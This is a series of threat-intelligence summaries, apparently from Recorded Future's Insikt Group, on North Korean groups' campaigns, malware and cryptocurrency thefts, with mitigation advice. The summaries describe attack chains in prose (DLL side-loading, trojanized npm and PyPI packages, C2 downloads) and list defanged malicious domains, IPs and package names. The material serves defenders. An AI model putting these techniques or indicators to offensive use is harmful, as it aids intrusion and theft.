Diamond Model
Entities
Sources
Kaspersky reported on April 12, 2023, regarding a Lazarus Group campaign, tracked as DeathNote, also known as Operation Dream Job, that was expanding its tactics, techniques, and procedures (TTPs). Lazarus Group is a North Korean threat group that has previously targeted cryptocurrency-related businesses. Lazarus Group transitioned to automotive and academic sectors that work under defense contractors and diplomatic services in Eastern Europe. The DeathNote campaign occurred between October 2019 and March 2022. The majority of victims were in Africa, South Korea, Cyprus, the United States, Taiwan, and Hong Kong.

Lazarus Group used social engineering lures that mimicked cryptocurrency businesses and defense contractors to trick victims into interacting with macro-laced Microsoft Office Word attachments and PDF files. When the victims opened the file with macro-enabled, the macro installed an obfuscated Visual Basic Script (VBScript) that extracted 2 payloads in the form of harmful UltraVNC with backdoor capabilities and a multi-stage binary infection process.

In the event the payload was executed without a command-line parameter, the payload displayed a legitimate UltraVNC viewer to conceal malicious activities when the payload ran in the background. Lazarus Group embedded the backdoors, such as Manuscrypt and COPPERHEDGE, in svchost.exe to evade detection and establish a connection to the command-and-control (C2) server. Additionally, the downloader gathered a follow-on payload, such as the Blindingcan, to execute in the memory. Lazarus Group sideloaded Mimikatz to log keystrokes and steal clipboard data from the victims.

North Korea-Sponsored Threat Group Suspected to be Using New macOS Malware in Financially-Motivated Campaigns
By Insikt Group | Published Apr 26, 2023 | Last modified May 2, 2023
Note
Diamond Model
Entities
Sources
Jamf Threat Labs reported on April 21, 2023, that it had discovered a new macOS malware family, which it dubbed RustBucket, which they suspected could be attributed to North Korean state-sponsored threat group APT38. APT38 is known to target financial entities around the world to steal cryptocurrency. The new macOS malware RustBucket initially masquerades as a PDF viewer application and lures victims to download and open a malicious finance-themed PDF, which then deploys a trojan that conducts reconnaissance on the victim machine.

According to Jamf Threat Labs, how threat actors achieved initial access with RustBucket is unconfirmed at this time, but RustBucket masquerades as a PDF viewer application (Internal PDF Viewer.app). Jamf Threat Labs noted that the PDF viewer application can likely only be executed if the victim manually overrides macOS’s Gatekeeper. Gatekeeper warns users who are about to execute software created by a developer that has not registered with Apple; it can be configured to be overridden with one click. The PDF viewer, once executed, contains a stage-one AppleScript file that retrieves a second-stage payload from a C2 server. The stage-two payload is written in Objective-C and opens a malicious PDF file. A sample PDF file was a 9-page venture capital investment strategy document that when opened, reached out to a C2 server to download a stage-three trojan that could then conduct reconnaissance of the victim machine. As of April 21, 2023, Jamf Threat Labs noted that VirusTotal could not detect the stage-one or stage-two RustBucket components.

Jamf Threat Labs connected RustBucket to BlueNoroff primarily because of the use of cloud.dnx[.]capital in the first stage of the attack. Proofpoint connected the domain to BlueNoroff’s campaigns in a January 2023 report. Additionally, Kaspersky reported that BlueNoroff “created numerous fake domains impersonating venture capital firms and banks,” which “align[ed] with the social engineering schemes discovered in the [RustBucket] PDF document” sample.

Insikt Group reporting on recent threat activity related to APT38 can be found using the Recorded Future Intelligence Cloud. Some researchers classify APT38 as a subgroup of Lazarus Group. Lazarus Group is the umbrella term covering threat groups that conduct espionage and financially-motivated campaigns on behalf of the Democratic People’s Republic of Korea (DPRK; North Korea). According to Recorded Future data, APT38 has been active since at least 2014. APT38 has a history of conducting thorough reconnaissance of their targets before attempting initial access operations. Preferred methods for initial access have included strategic web compromise, searching for vulnerable servers on the target’s network, and spear phishing key employees that the group identified during the reconnaissance phase. In recent years, the group has shifted its targeting to financial technology and cryptocurrency companies as well as their users. On January 23, 2023, the US Federal Bureau of Investigation (FBI) confirmed that APT38, was responsible for the theft of $100 million in cryptocurrency from the blockchain firm Harmony’s Horizon Bridge. More information can be found in this Insikt Group report.

It is highly likely that North Korean state-sponsored cyber threat actors will continue to target the financial and cryptocurrency industry in an effort to generate revenue for North Korean government priorities. It is also likely that these threat groups will continue to develop sophisticated methods to target the Apple ecosystem, as Apple products continue to steadily increase in market share. Given this malware’s and APT38’s historical use of social engineering to facilitate infection chains, organizations can take measures to prevent compromise via human error by implementing security awareness training for its employees. Organizations that employ macOS in day-to-day operations should ensure that user’s cannot override the operating system's built-in Gatekeeper. Administrators can use mobile device management (MDM) solutions to restrict network users without administrative authorities from removing applications or downloading new ones. This measure alone could thwart the RustBucket infection chain.

At a minimum, administrators should also enforce mandatory multi-factor authentication (MFA) for all network users; authentication applications like Google Authenticator should be used in lieu of authentication via email or SMS. Given APT38’s history of conducting thorough reconnaissance before attempting initial access operations, organizations are urged to ensure its critical, vulnerable systems are not exposed to the internet and that public-facing applications are securely configured to prevent opportunistic attacks. Implementing the principles of granting the least privilege based on the role can minimize a threat actor's access to high-value data once they have accessed a victim’s account.

Lazarus Group Exploits Vulnerable Windows IIS Web Servers and Side-Loads DLL Malware
By Insikt Group | Published May 24, 2023
Note
Diamond Model
Entities
Sources
AhnLab Security Emergency Response Center (ASEC) published a report on May 23, 2023, about Lazarus Group’s recent campaign that exploits vulnerable Windows Internet Information Services (IIS) web servers. Lazarus Group purportedly exploited poorly managed or vulnerable web servers to enable their initial infection phase. The Lazarus Group also used their usual DLL side-loading technique to run their malware within the vulnerable web server. 

According to ASEC’s report, Lazarus Group deployed a malicious DLL (msvcr100.dll) alongside a normal application (Wordconv.exe) through the Windows IIS web server process (w3wp.exe). The malicious DLL was executed alongside with the list of DLLs of the Wordconv.exe. The malicious DLL was executed first and loaded into the memory of the Wordconv.exe process via DLL search priority. ASEC assessed that msvcr100.dll is possiblya variant of the previously reported malware (cylvc.dll), because they have similar code. Notably, both malicious DLLs decrypt the data files with the Salsa20 algorithm, then execute the portable executable (PE) file in memory.

Once the Lazarus Group established a foothold on the compromised web server, they created additional malware (diagn.dll) using a Notedpad++ plugin exploit. The diagn.dll received the aforementioned PE file and executed it in the memory. The PE file’s malicious behavior in the recent campaign is undetermined. However, ASEC surmised that the PE file is Mimikatz malware because Lazarus Group was observed accessing the memory of the lsass.exe process to obtain system data and credentials. 

Lastly, the Lazarus Group used the stolen system credentials to remotely access the compromised web server to conduct internal reconnaissance and then perform lateral movement. ASEC did not observe any further malicious activities after Lazarus Group’s lateral movement. 

ASEC highlighted that Lazarus Group frequently exploits improperly-configured, public-facing infrastructure in order to enable initial infection via  “Log4Shell,  public certificate vulnerability, [or] 3CX supply chain attack”. ASEC emphasized therefore, that it is critical for organizations to use attack-surface management services to prevent attacks like the ones carried out by Lazarus Group.

In 2 New Campaigns, Kimsuky Distributes New RandomQuery Variant via Phishing, Installs Meterpreter Backdoor on Vulnerable Web Servers
By Insikt Group | Published May 24, 2023 | Last modified May 31, 2023
Note
Diamond Model
Entities
Sources
In mid-to-late May 2023, SentinelLabs and the AhnLab Security Emergency response Center (ASEC), reported on the following 2 ongoing Kimsuky threat campaigns: SentinelLabs reported that North Korean advanced persistent threat (APT) group Kimsuky was targeting “North Korea-focused information services, human rights activists, and DPRK-defector support organizations'' with phishing emails to deploy a variant of the RandomQuery malware that focuses on file enumeration and information exfiltration; and ASEC reported that Kimsuky was targeting the web servers of South Korean organizations to install Metasploit Meterpreter backdoor malware.

While 1 campaign relied on carefully-tailored phishing campaigns to initiate its infection chain, the other exploited insecurely-configured public-facing interfaces. Both of the threat campaigns appeared to have a primary objective of establishing persistence to enable cyberespionage. While the campaign that used RandomQuery is ongoing as of May 23, 2023, it is unclear if the campaign targeting Windows IIS web servers is still ongoing.
 
Kimsuky: Campaign Targeting North Korean Defector Support Organizations with RandomQuery
According to SentinelLabs, Kimsuky’s campaign that targets organizations that support North Korean defectors began with phishing emails; used Microsoft Compiled HTML Help (CHM) files to distribute RandomQuery malware (a malware family frequently used by Kimsuky); and used RandomQuery to conduct file reconnaissance and exfiltrate system and hardware information, “laying the groundwork for subsequent precision attacks”.

The phishing emails used in this campaign claimed to be from Daily NK, an online newspaper located in Seoul, South Korea that covers North Korean events. Kimsuky lured victims to download an attached Microsoft Compiled HTML Help (CHM) file. Upon execution of the CHM file, a Visual Basic (VB) script was executed at system startup, which then downloaded and executed the second-stage payload from the adversary-controlled command-and-control (C2) server via an HTTP GET request to the victim’s system. The second-stage payload was a VBScript RandomQuery variant. The RandomQuery malware collected system data, including running processes and installed applications, files, and directories. Kimsuky then exfiltrated the stolen data  to the C2 server.

Kimsuky strategically used less common top-level domains (TLDs) and domain names for their malicious infrastructure and phishing emails, imitating standard .com TLDs to evade detection. SentinelLabs assessed that the campaign “indicates a shift towards [Kimsuky] using a variant of the RandomQuery malware that has the single objective of file enumeration and information exfiltration”, which contrasts from “RandomQuery variants supporting a wider array of features, such as keylogging and execution of further specialized malware”.

Kimsuky: Campaign Targeting South Korean Windows IIS Web Servers

ASEC observed Kimsuky targeting public-facing South Korean Windows IIS web servers that were likely unpatched and poorly-configured. Upon compromising these unsecure web servers, the threat actors executed a Powershell command to download Metasploit Meterpreter backdoor malware, and used Meterpreter as a stager to install proxy malware, again using a PowerShell command. Kimsuky is also known to use proxy malware. However, unique to this threat campaign, the proxy malware was developed in GoLang. ASEC assessed that the purpose of the proxy malware was to enable “RDP connection to the infected system in later stages”.

For a complete description of technical data, indicators of compromise (IOCs), and methods for detection related to these campaigns, please refer to both SentinelLabs's and the ASEC's original report.

According to Insikt Group research, Kimsuky is a North Korean state-sponsored threat group that was first documented in 2013 and has been highly active since 2022. Kimsuky is primarily cyber espionage-motivated and usually targets South Korean ​​individuals and organizations of interest to the North Korean government. Kimusky has also targeted Japanese and US government entities. Kimsuky commonly uses social engineering in their operations and their initial access vector is spearphishing.

Historically, once Kimsuky gained initial access, the group used a custom Visual Basic script-based malware and PowerShell or Windows Command Shell for malware execution. Kimsuky usually achieves persistence through modifying system processes or exploiting Remote Desktop Protocol (RDP) and Virtual Network Computing (VNC) services. The group uses off-the-shelf commercial tools and process injection for privilege escalation, disables the system firewall, and deletes files after they are transferred to the C2 server for evading defenses.

In order to safeguard against attacks like those carried out in these threat campaigns, organizations should consider both tactics, techniques, and procedures (TTPs) that are typical of Kimsuky, and those that appear to be newly added to the threat group’s attack arsenal.

Typical Kimsuky TTPs

Typical of Kimsuky, the primary initial access vector for one of these campaigns was phishing emails. Organizations should ensure they have a security best practices program in place to educate employees in methods to avoid victimization via social engineering. Network segmentation, the principles of least privilege, and conditional access policies can help limit a threat actor's access to systems in inevitable instances of human error.

The other campaign involved the likely exploitation of unpatched public-facing systems. An organization’s first line of defense is always to ensure that its public-facing systems are properly configured to prevent opportunistic attacks and patched, via a patch management program.

Additional methods frequently employed by Kimsuky that were observed in these campaigns included the use of a malicious CHM file attachment to initiate a stager; Visual Basic (VB) scripts to deliver malicious payloads; PowerShell commands to download malware; RandomQuery to conduct network enumeration and facilitate espionage operations.

New Kimsuky TTPs

The following TTPs were new additions to the Kimsuky attack arsenal: the use of a RandomQuery instance specifically focused on reconnaissance and exfiltration of system and hardware information (limited in functionality compared to earlier versions); the use proxy malware developed in GoLang; the use of the open-source tool Meterpreter; the use of and less-common TLDs that imitate standard .com TLDs to evade security detection (a method that is increasingly common in Kimusky campaigns). Network defenders can use this data and the specific IOCs provided by both SentinelLabs and ASEC to prime their security systems, including security information and event management (SIEM) software in combination with Endpoint Detection and Response (EDR) tools, to alert them to potential malicious activities related to Kimusky campaigns.

Lazarus Group Linked To Campaign That Has Stolen $35 Million Worth of Cryptocurrency From Atomic Wallet Customers
By Insikt Group | Published Jun 9, 2023
Note
Diamond Model
Entities
Sources
The Record by Recorded Future released a report on June 5, 2023, regarding an ongoing campaign that has led to $35 million worth of cryptocurrency being stolen from customers of Atomic Wallet. On June 7, 2023, Elliptic, a blockchain analytics solution, assessed that the campaign is likely linked to the North Korean Lazarus Group. Atomic Wallet is a decentralized platform that supports Linux, Windows, Android, iOS, and macOS operating systems. Atomic Wallet confirmed on June 3, 2023, that they received reports that some of the user's wallets were compromised. On June 5, 2023, Atomic Wallet said that less than 1% of active monthly users were affected during the attack. In response to the attack, Atomic Wallet communicated with undisclosed blockchain analytics to block the stolen funds.

Although the attack method used to access the users’ Atomic Wallet remains unverified, Certik researchers said that threat actors may have exploited a vulnerability in the Atomic Wallet application that exposed users’ private keys. Using the Recorded Future Intelligence Cloud, we did not observe instances of threat actors claiming responsibility for Atomic Wallet attacks across the dark web and underground forums tracked by Recorded Future.

On June 7, 2023, a blockchain analytics solution, Elliptic assessed that the North Korean Lazarus Group likely carried out this cyberattack against Atomic Wallet based on the following evidence related to previous campaigns against cryptocurrency exchanges:

• The laundering approach shares similarities with previous campaigns by Lazarus Group.
• The use of Sinbad, which was used by Lazarus Group against Axie Infinity crypto heists. Sinbad is a coin mixer for Bitcoin cryptocurrency.
• The portion of stolen cryptocurrency in the Atomic Wallet was sent to some of Lazarus Group's wallet addresses.

Lazarus Group's Social Engineering Campaign Targeting Developers in Cryptocurrency and Cybersecurity Sectors on GitHub
By Insikt Group | Published Jul 21, 2023
Note
Diamond Model
Entities
Sources
On July 18, 2023, GitHub issued a warning about a social engineering campaign carried out by the Lazarus Group (Cyber Warfare Guidance Unit, Diamond Sleet). The campaign specifically targeted developers in the blockchain, cryptocurrency, online gambling, and cybersecurity sectors, with the intention of infecting their systems with malware. GitHub noted that the Lazarus Group’s latest campaign was “low volume”, and that no GitHub or NPM systems were compromised as a result of the campaign. Lazarus Group is a North Korea-affiliated threat group that has historically targeted victims in the cryptocurrency or blockchain-related sectors.

During the campaign, the Lazarus Group created pseudo-profiles on social media platforms (LinkedIn, Slack, and Telegram) or hacked legitimate accounts on GitHub to interact with employees in technology firms. Once Lazarus Group established a trusted relationship with its victims, the threat actors invited the victims to collaborate on GitHub projects supposedly related to media players and cryptocurrency tools.

Unknown to the victims, these projects contained malicious Node Package Manager (NPM) dependencies that downloaded additional malware onto the victims' devices. NPM serves as a central repository for open-source JavaScript code, making it convenient for developers to reuse code and manage dependencies in their projects. Threat actors frequently exploit the implicit trust that developers have in NPM packages to spread malware to the NPM user base.

In response to the campaign, GitHub deactivated all NPM and GitHub accounts linked to the campaign and shared indicators of the associated domains, GitHub accounts, and NPM packages involved in the malicious activities.

Jumpcloud Targeted By Cyberattack, Attribution Linked to Lazarus Group
By Insikt Group | Published Jul 21, 2023 | Last modified Jul 21, 2023
Note
Diamond Model
Entities
Sources
On July 20, 2023, CrowdStrike via Reuters assessed that the Lazarus Group, a North Korean nation state sponsored group, accessed systems of US enterprise software company JumpCloud in order to target the company’s cryptocurrency clients and steal cryptocurrency funds. On the same day, SentinelOne also reported that JumpCloud was targeted by a North Korean state sponsored advanced persistent threat (APT). This “highly confident” assessment by researcher Tom Hegel was made based on the identification of IOCs that are attributed to North Korean threat actors.

The incident was initially discovered on June 27, 2023, 1 week after the threat actors conducted a spearphishing attack to gain access to JumpCloud's internal systems. Although initially no evidence was found to suggest customers were affected, the company decided to generate new customer credentials and access keys as well as rebuilding compromised infrastructure as a precautionary measure. However, on July 5, 2023, unusual activity was detected in the commands framework for a small group of customers during a follow-up investigation. JumpCloud then force-rotated all admin API keys and informed customers to generate new keys. JumpCloud disclosed the attack was highly targeted and affected specific customers. Details regarding the number of impacted customers have not been disclosed.

JumpCloud is a directory-as-a-service company that aims to provide a replacement for Active Directory (AD) and offers features such as password and device management.

CoinsPaid Attributes $37.3 Million Crypto Theft to The Lazarus Group
By Insikt Group | Published Jul 28, 2023 | Last modified Jul 31, 2023
Note
Diamond Model
Entities
Sources
CoinsPaid, an Estonian crypto payment platform, has disclosed that they experienced a cyberattack on July 22, 2023, leading to $37,200,000 worth of cryptocurrency being stolen. This attack was attributed to the Lazarus Group (Cyber Warfare Guidance Unit, Diamond Sleet), a North Korean advanced persistent threat group (APT), although CoinsPaid did not provide further details on how they linked Lazarus to the attack. . There was no independent confirmation of the link between the attack and Lazarus at the time of the disclosure.

In response to the attack, CoinsPaid collaborated with Chainalysis, Binance, Crystal, Match Systems, Staked.us, OKCoinJapan, Valkyrieinvest, and Estonian law enforcement authorities to investigate the incident and track down the responsible threat actors.

NPO Mashinostroyeniya Targeted by North Korean Threat Actors
By Insikt Group | Published Aug 8, 2023
Note
Diamond Model
Entities
Sources
The NPO Mashinostroyeniya (JSC MIC Mashinostroyenia), a major Russian missile and military spacecraft manufacturer, has been targeted in  a cyber intrusion attributed to ScarCruft and Lazarus Group, according to a report by SentinelOne on August 7, 2023. NPO Mashinostroyeniya possessed sensitive intellectual property tied to missile technology, which was being developed and used by the Russian military. In 2 distinct instances, the NPO Mashinostroyeniya experienced compromises of its internal IT infrastructure. One of these incidents involved a breach of a Linux email server, while the other used a Windows backdoor named OpenCarrot.

The organization discovered the intrusion in mid-May 2022, a period closely aligned with Russia's veto of the United Nations (U.N.) sanctions against North Korea. During this period, the technology personnel at NPO Mashinostroyeniya noticed suspicious communications occurring between its internal processes and external infrastructure in their emails. Additionally, they identified a dynamic-link library (DLL) file within their internal systems that raised suspicions.

During the investigation, SentinelOne confirmed that the DLL file was an OpenCarrot, a Windows operating system (OS) backdoor. This backdoor, associated with the Lazarus Group (Cyber Warfare Guidance Unit, Diamond Sleet), possessed a wide range of capabilities, including reconnaissance, manipulation of file systems and processes, and management of communication for compromised machines across local networks.

Additionally, it also revealed suspicious network activity, suggesting a compromise of NPO Mashinostroyeniya's Linux email server, which was publicly hosted at vpk.npomash[.]ru (Intelligence Card) “185.24.244[.]11 (Intelligence Card)”. It was noted that the email server engaged in outbound communication with an infrastructure that has since been attributed to the APT37 (Cloud Dragon, Group 123, Reaper, Scarcruft, TAG-72). The compromised data provided valuable insights into the organization's network architecture and vulnerabilities.

The Hacker News noted that, although the precise methods used to breach the email server and deploy OpenCarrot were undisclosed, the investigation into the attack infrastructure revealed 2 domains, centos-packages[.]com (Intelligence Card) and redhat-packages[.]com (Intelligence Card), that shared similarities to the names used by threat actors in a previous hack involving JumpCloud in June 2023. This alignment of two distinct North Korean threat actors targeting the same entity indicated a substantial strategic espionage mission with potential implications for North Korea's missile program.

Labyrinth Chollima Persist in VMConnect Supply Chain Campaign with New Malicious Python Packages in PyPI Repository
By Insikt Group | Published Sep 1, 2023
Note
Diamond Model
Entities
Sources
On August 31, 2023, ReversingLabs reported that Lazarus Group (Labyrinth Chollima), had added 3 new malicious Python packages to the Package Index (PyPI) repository as part of an ongoing supply chain campaign known as VMConnect. The VMConnect campaign comprised a collection of Python packages that imitates open-source Python tools, with minor differences in descriptions and file structures. The main changes take place within the "init.py" file, where a malicious function from 'cookies.py' is executed, enabling the collection of data from compromised machines, allowing threat actors to download second-stage malware payloads.

The 3 newly added malicious packages are as follows:

tablediter (736 downloads): This package pretends to be a tool for editing tables.
request-plus (43 downloads): This package impersonates the widely-used 'requests' Python library, commonly used for making HTTP requests.
requestspro (341 downloads): This package also mimics 'requests' but with the addition of "pro" to its name, creating the illusion of an enhanced version of the legitimate library.

Once data had been gathered, it was transmitted to the threat actors' command-and-control (C2) servers via a POST HTTP request. In response, the C2 server provided an obfuscated Python module that utilized Base64 and XOR encryption, along with additional instructions. This module also contained a URL to the second-stage payload. However, researchers couldn't access this payload at the time of the writing.

Lazarus Group Distributes New QuiteRAT Malware via Previously-Patched ManageEngine Flaw (CVE-2022-47966) in Ongoing Campaign
By Insikt Group | Published Sep 7, 2023
Note
Diamond Model
Entities
Sources
On August 24, 2023, Cisco Talos reported about an ongoing campaign conducted by North Korea-linked Lazarus Group. The campaign involves use of a new remote access trojan (RAT) known as QuiteRAT, which Lazarus Group distributes by exploiting CVE-2022-47966, a ManageEngine ServiceDesk Plus vulnerability. The campaign began in early 2023 after Cisco Talos detected successful exploitation activity that targeted an unnamed internet backbone infrastructure provider based in Europe, with subsequent deployment of QuiteRAT. Additionally, Cisco Talos noted that the attacks occurred shortly after a proof-of-concept (PoC) exploit code for the CVE-2022-47966 was publicly-shared on GitHub.

Cisco Talos’ overall telemetry shows that victims in this campaign included internet backbone infrastructure providers and healthcare entities in Europe and the US. Cisco Talos attributed the campaign to Lazarus Group with high confidence due to overlapping tactics, techniques, and procedures (TTPs) observed in this campaign with that of previous Lazarus Group campaigns.

This recent campaign’s infection chain begins with Lazarus Group exploiting CVE-2022-47966, a ManageEngine ServiceDesk Plus flaw that was patched in October 2022, to gain initial access. From there, the threat actors install QuiteRAT, which immediately establishes connection with the command-and-control (C2) server. QuiteRAT then performs reconnaissance by gathering basic information from an infected device and sending it to the C2 server. This information includes the operating system used and the current version, device architecture (32 or 64-bit), patch information, service packs, MAC and IP addresses, and others.

Further, Cisco Talos stated that QuiteRAT does not have built-in persistence capabilities, and as a result, Lazarus Group achieves persistence by manually executing commands in the infected device’s terminal Window. The commands pertain to creating registry keys that will allow QuiteRAT to persist in the system across reboots. Then, the malware proceeds to execute a different set of arbitrary commands on the target device to perform other malicious activities, such as downloading additional payloads. Cisco Talos did not provide further details about additional malware deployed in this campaign.

Cisco Talos’ analysis of QuiteRAT shows that it shares similar functionalities and code designs with an older malware known as MagicRAT, which had been developed and historically distributed by Lazarus Group. For example, some coding libraries incorporated into QuiteRAT and MagicRAT were based off of the Qt framework, an open-source software development platform. Cisco Talos noted that Lazarus Groups’ use of the Qt framework makes malware analysis and detection more difficult, adding that the framework is not commonly observed in malware development.

Furthermore, Cisco Talos assessed with high confidence that QuiteRAT is a newer variant of MagicRAT, with QuiteRAT having a smaller file size, likely in an attempt to evade detection more efficiently. Both malware, however, still share similar functionalities in terms of allowing adversaries to perform code execution attacks on an infected system.

QuiteRAT is part of a relatively narrow malware family tree, in that QuiteRAT is a successor to MagicRAT, which has been linked in a September 2022 campaign to an older backdoor known as TigerRAT. This previous campaign, which was analyzed by Cisco Talos, was attributed to Lazarus Group, who exploited the Log4Shell vulnerability (CVE-2021-44228) for initial access. Victims of this older campaign are energy providers in Canada, Japan, and the US. TigerRAT was initially disclosed in 2021 by the Korean Internet and Security Agency (KISA) and the KrCERT (the National Computer Emergency Response Team in Korea), following the malware’s involvement in a December 2021 campaign dubbed Operation ByteTiger. This previous campaign targeted South Korean entities.

Shortly after the discovery of QuiteRAT, Cisco Talos also revealed (on the same day) a new malware tracked as CollectionRAT, which is used in the recent QuiteRAT campaign. Similar to QuiteRAT and MagicRAT, Cisco Talos noted that CollectionRAT also allows Lazarus Group to conduct reconnaissance, perform arbitrary commands, and download additional payloads on victim networks. The researchers  explained, however, that although QuiteRAT and CollectionRAT are deployed within the same victim network, they appear to be deployed disparately; for example, QuiteRAT is installed right after CVE-2022-47966 is exploited, whereas CollectionRAT is distributed via a a malicious version of the open-source reverse-tunneling utility known as Plink. These different distribution methods suggest that the 2 RATs are deployed opportunistically, and that they are independent of each other despite operating within the same victim machine and malicious infrastructure.

Just like the QuiteRAT malware family, CollectionRAT has also been linked by Cisco Talos to a previously-documented malware known as EarlyRAT (also referred to as Jupiter). The malware was attributed to a North Korean threat group known as Andariel, which is a subgroup of Lazarus Group, by Kaspersky researchers in June 2023. This relatively recent campaign also involved exploitation of the Log4Shell vulnerability for initial access.

Based on the capabilities demonstrated by all 4 trojans linked to Lazarus Group, namely QuiteRAT, MagicRAT, TigerRAT, and CollectionRAT, the group appears to be distributing these malware for reconnaissance and/or espionage, at least at the time of writing. Additionally, each documented activity involving these 4 trojans  appears to be an improved version of the previous, with Lazarus Group choosing their targets opportunistically.

The development of QuiteRAT, which appears to be a “lighter” version of MagicRAT, implies that Lazarus Group is both experimenting with and improving their arsenal. These improvements, which appear to be focused on upgrading existing malware occur at a relatively fast pace, given that they have both been developed and used in the wild in less than a year. As a result, we anticipate further developments related to this malware family.

Furthermore, it is not immediately clear whether Lazarus Group will be using these new and improved tools to conduct larger, more financially-profitable operations. Many campaigns conducted by Lazarus Group are financially-motivated, wherein they are notable for conducting highly-targeted attacks on financial entities such as cryptocurrency exchanges and blockchains. However, research by Recorded Future also indicates that the group is heavily engaged with espionage operations.
These latest developments demonstrated by Lazarus Group indicate that the group will continue to conduct sophisticated attacks. Therefore, we recommend the following mitigation measures to protect against these attacks:
Apply the relevant patches for CVE-2022-47966; ManageEngine stated that the vulnerability can be remediated by updating affected products. Note that Lazarus Group is known to weaponize vulnerabilities for initial access, apart from conducting social engineering attacks, such as phishing.
As noted by Cisco Talo, QuiteRAT is downloaded from an external IP address 146[.]4[.]21[.]94 (Intelligence Card), which has been linked to Lazarus Group since May 2022. IT administrators should block communications associated with this IP address to help prevent potential QuiteRAT infections.
As much as possible, IT administrators should configure Windows terminal settings to restrict commands that allow for registry modification.
Lastly, IT administrators should monitor inbound and outbound traffic for suspicious activity, such as attempts made by malicious actors to communicate between the local system and the C2 server. Firewalls should also be configured to detect and block malicious traffic.

Mixin Network Confirms Cyberattack Resulting in the Loss of $200 Million Worth of Cryptocurrencies
By Insikt Group | Published Sep 28, 2023 | Last modified Sep 29, 2023
Note
Diamond Model
Entities
Sources
On September 25, 2023, Mixin Network, a peer-to-peer cryptocurrency transactional platform, disclosed that threat actors had infiltrated the database of its cloud service provider on September 23, 2023. As a result of the compromise, Mixin Network reported it lost approximately US$200 million worth of various cryptocurrencies. We were not able to determine if the stolen assets belonged to the company or its customers.

Mixin Network temporarily suspended its deposit and withdrawal services. The Mixin incident stands out as one of the most noteworthy cryptocurrency heists of the year, prompting immediate speculation about the possible involvement of North Korea's Lazarus Group. However, at the time of writing, information on the identity of the threat actors responsible for the attack and the method used to acquire Mixin Network's assets remains sparse.

Lazarus Group Exploited Zero-Day Vulnerability Found in A Certificate Software Commonly Used by Public Institutions and Universities to Infiltrate Systems of A South Korean Financial Firm
By Insikt Group | Published Mar 9, 2023 | Last modified Oct 19, 2023
Note
Diamond Model
Entities
Sources
On March 7, 2023, ASEC released a report on Lazarus Group’s malicious campaign exploiting a zero-day vulnerability in a certificate software commonly used by public institutions and universities. Lazarus Group exploited the vulnerability to access an undisclosed South Korean financial firm’s Windows 10 systems and perform lateral movement. However, ASEC did not disclose the vulnerable certificate software because the vulnerability was still in the process of full verification, and no software patch was available.

Lazarus Group also initiated defense evasion techniques such as using Bring Your Own Vulnerable Driver (BYOVD) attack to disable anti-analysis software, timestamp modification (timestomping), updating the filename before deletion, execution artifact deletion, and masquerading payloads’ filename as a legitimate system file. Initial infiltration against the company began in May 2022, and researchers observed re-infiltration using the software 0-day vulnerability on October 21, 2022.

According to ASEC's analysis of the affected systems, Lazarus Group abused the Service Host (svchost.exe) after successfully exploiting the certificate software or injecting malicious File Transfer Program files (ftp.exe) to move laterally within the targeted system. The compromised svchost.exe and ftp.exe allows Lazarus Group to elevate privileges in the infected systems, connect to multiple adversary-controlled command-and-control (C2) servers, side-load DLLs, and deploy additional backdoor loaders and their payloads. Additionally, perform the mentioned defense evasion techniques to stay under the radar.

The full list of IOCs can be found at the end of ASEC’s report.

Lazarus Group and Andariel Exploit CVE-2023-42793 in TeamCity Servers for Supply Chain Attacks
By Insikt Group | Published Oct 19, 2023 | Last modified Oct 19, 2023
Note
Diamond Model
Entities
Sources
On October 18, 2023, Microsoft reported that North Korean threat groups Lazarus Group (Lazarus) and Andariel, have been exploiting a vulnerability in TeamCity servers tracked as CVE-2023-42793. If exploited, CVE-2023-42793 allows for remote code execution, resulting in the theft of Local Security Authority Subsystem Service (LSASS) credentials which can then be used for  lateral network movement. In September, TeamCity patched CVE-2023-42793.

Upon compromising TeamCity servers, Lazarus employed 2 attack chains: one involved deploying the ForestTiger malware as a backdoor to execute commands on the breached server. The second involved using DLL search order hijacking to deploy a malware loader named FeedLoad, which installed an unnamed remote access Trojan (RAT). Andariel created a 'krtbgt' admin account on the compromised server, executed commands to gather system information, and established a persistent connection with Andariel's servers by installing the HazyLoad proxy tool.

Lazarus Group's Operation Dream Job Deploys Trojanized VNC Apps Targeting Defense, Nuclear Engineering, and Maritime Sectors
By Insikt Group | Published Oct 19, 2023 | Last modified Oct 20, 2023
Note
Diamond Model
Entities
Sources
On October 17, 2023, Kaspersky reported that the North Korean Lazarus Group has been targeting job seekers across the defense and nuclear industries via a trojanized virtual network computing (VNC) application that is embedded with an unnamed trojan, as part of their ongoing ‘Operation Dream Job’ campaign. Targets include entities in the production of radar systems, UAVs, military vehicles, and maritime companies. The group lured victims on platforms like LinkedIn, Telegram, and WhatsApp with fake job opportunities.

Once executed, the trojanized VNC application deploys additional malware payloads:

An LPEClient, which has the capability to collect data of the targeted systems, establish command-and-control (C2) connections, and circumvent behavior monitoring by disconnecting user-mode syscalls.
An updated version of COPPERHEDGE, a backdoor equipped to execute arbitrary commands, conduct system reconnaissance, and exfiltrate data.
A custom-made malware designed to transmit files to a C2 server.

In order to avoid detection by security solutions that rely on behavior-based analysis, the trojan operates stealthily, activating only when the user chose a server from the menu of the Trojanized VNC client.

Updated MATA Malware Used to Target Eastern European Oil, Gas, and Defense Firms
By Insikt Group | Published Oct 20, 2023
Note
Diamond Model
Entities
Sources
On October 18, 2023, Kaspersky (a Russia-based company) researchers disclosed that an updated version of the MATA backdoor malware had been used in cyberattacks targeting oil, gas, and defense sectors in Eastern Europe between August 2022 and May 2023. The framework has been active since at least 2018. The attacks involved breaching security solution administration panels by using spear-phishing emails to conduct surveillance and trick victims into downloading malicious executables that exploited the Microsoft Internet Explorer vulnerability, CVE-2021-26411. The updated MATA malware combines various modules, each designed to achieve specific objectives. These include a loader, a trojan, and an information stealer to gain persistence in targeted networks. The MATA malware exists in both Microsoft Windows and Linux variants, with the latest version featuring extensive remote control capabilities and support for various protocols. The threat actors also used techniques such as using a user-mode rootkit and CVE-2021-40449 exploit to bypass endpoint security tools and endpoint detection and response (EDR) systems.

Although these attacks have previously been attributed to the Lazarus Group,  Kaspersky researchers note that the malware overlaps with both Lazarus Group activity as well as the ’APT groups associated with Five Eyes.

Lazarus Group Deploys LightlessCan Backdoor Against Spanish Aerospace Company
By Insikt Group | Published Sep 29, 2023 | Last modified Oct 24, 2023
Note
Diamond Model
Entities
Sources
